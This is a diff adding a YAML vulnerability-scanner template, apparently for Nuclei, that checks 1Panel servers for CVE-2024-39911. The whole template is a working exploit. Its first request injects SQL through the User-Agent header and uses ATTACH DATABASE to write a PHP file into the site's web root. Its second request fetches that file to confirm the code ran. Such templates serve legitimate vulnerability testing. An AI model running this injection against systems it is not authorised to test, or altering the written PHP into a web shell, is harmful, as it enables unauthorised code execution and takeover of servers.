@@ -1,0 +1,33 @@
+id: 1panel-config-user-agent-write
+
+info:
+  name: "1Panel User-Agent 字段触发配置文件写入漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    1Panel是一款基于Linux的服务器运维管理面板，提供Web界面用于主机监控、文件管理、数据库及容器管理。系统深度集成WordPress和Halo。攻击者可通过操控User-Agent字段触发配置文件写入漏洞，导致非授权文件操作。
+  reference:
+  - CVE-2024-39911
+  tags: 1Panel
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /.git/config HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: NTest.cn',"args", "sqlInjectA", "", "ZHVkZXN1aXRlLmNu", "NTest.cn", 0, "deny", 0, 1);ATTACH DATABASE '/www/sites/index/index/NTest.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?php echo "NdayTest";?>');#
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
